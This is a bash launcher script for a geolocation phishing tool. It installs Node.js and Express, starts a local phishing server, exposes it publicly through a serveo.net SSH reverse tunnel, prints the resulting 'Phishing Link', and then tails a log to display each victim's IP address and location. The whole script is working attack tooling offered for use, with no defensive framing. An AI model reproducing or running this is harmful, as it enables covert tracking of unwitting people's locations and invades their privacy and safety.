#!/bin/bash

# Colors
GREEN="\e[32m"
RED="\e[31m"
BLUE="\e[34m"
YELLOW="\e[33m"
RESET="\e[0m"

# Variables
SERVER_PORT=3000
SERVER_PID=""
TUNNEL_PID=""
PHISHING_URL=""

# Banner
banner() {
    clear
    echo -e "${YELLOW}"
    cat << "EOF"

     _                _    _                _    
    | |              | |  | |              | |   
    | |     ___   ___| |__| | __ ___      _| | __
    | |    / _ \ / __|  __  |/ _` \ \ /\ / / |/ /
    | |___| (_) | (__| |  | | (_| |\ V  V /|   < 
    |______\___/ \___|_|  |_|\__,_| \_/\_/ |_|\_\
                                              
                                                                           
                              Developer : Sreeraj
                               
EOF
    echo -e "${GREEN}* GitHub: https://github.com/s-r-e-e-r-a-j\n${RESET}"
}

# Install Dependencies
install_dependencies() {
    echo -e "${YELLOW}[+] Checking dependencies...${RESET}"
    
    command -v node > /dev/null 2>&1 || { 
        echo -e "${RED}[-] Node.js is not installed! Installing...${RESET}"; 
        sudo apt install nodejs -y; 
    }

    command -v npm > /dev/null 2>&1 || { 
        echo -e "${RED}[-] npm is not installed! Installing...${RESET}"; 
        sudo apt install npm -y; 
    }

    command -v ssh > /dev/null 2>&1 || { 
        echo -e "${RED}[-] OpenSSH is not installed! Installing...${RESET}"; 
        sudo apt install openssh-client -y; 
    }

    npm list -g --depth=0 | grep -q 'express@' || { 
        echo -e "${RED}[-] Express.js is not installed! Installing...${RESET}"; 
        sudo npm install -g express; 
    }

    echo -e "${GREEN}[+] All dependencies are installed!${RESET}"
}

# Kill Any Existing Server on Port 3000
kill_old_server() {
    OLD_PID=$(lsof -ti :$SERVER_PORT)
    if [[ ! -z "$OLD_PID" ]]; then
        echo -e "${YELLOW}[+] Killing old server running on port $SERVER_PORT...${RESET}"
        kill -9 $OLD_PID
        echo -e "${GREEN}[+] Old server stopped!${RESET}"
    fi
}

# Start the Node.js Server
start_server() {
    echo -e "${YELLOW}[+] Starting Location Phishing Server...${RESET}"
    node server.js > server.log 2>&1 &
    SERVER_PID=$!
    sleep 2

    if ps -p $SERVER_PID > /dev/null; then
        echo -e "${GREEN}[+] Server started successfully!${RESET}"
    else
        echo -e "${RED}[-] Server failed to start!${RESET}"
        exit 1
    fi
}

# Start Serveo.net Tunneling
start_serveo() {
    echo -e "${YELLOW}[+] Starting Serveo.net tunnel...${RESET}"
    ssh -R 80:localhost:$SERVER_PORT serveo.net > serveo.txt 2>&1 &
    TUNNEL_PID=$!
    sleep 5

    if grep -q "Forwarding HTTP traffic" serveo.txt; then
        PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveo.net" serveo.txt)
        echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
    else
        echo -e "${RED}[-] Serveo failed!${RESET}"
        stop_server
        exit 1
    fi
}

# Clear logs on restart

echo "" > logs.txt

# Monitor for Received Location Data
monitor_data() {
    echo -e "${YELLOW}[+] Waiting for new location data...${RESET}"
    
    tail -n 0 -f logs.txt | while read line; do
        if [[ -n "$line" ]]; then  # Ensure line is not empty
            ip=$(echo "$line" | awk -F'|' '{print $1}' | tr -d ' ')
            location=$(echo "$line" | awk -F'|' '{print $2}' | sed 's/^ //')

            echo -e "${GREEN}[+] IP Address: ${BLUE}$ip${RESET}"
            echo -e "${GREEN}[+] Location: ${RED}$location${RESET}"
        fi
    done
}




# Stop the Server
stop_server() {
    echo -e "${YELLOW}[+] Stopping Location Phishing server...${RESET}"
    [[ ! -z "$SERVER_PID" ]] && kill $SERVER_PID 2>/dev/null
    [[ ! -z "$TUNNEL_PID" ]] && kill $TUNNEL_PID 2>/dev/null
    echo -e "${GREEN}[+] Server and tunnel stopped!${RESET}"
    exit 0
}

# Trap Ctrl+C to stop the server
trap stop_server SIGINT

# Run the script
banner
install_dependencies
kill_old_server
start_server
start_serveo

if [[ ! -f logs.txt ]]; then

    touch logs.txt
fi

monitor_data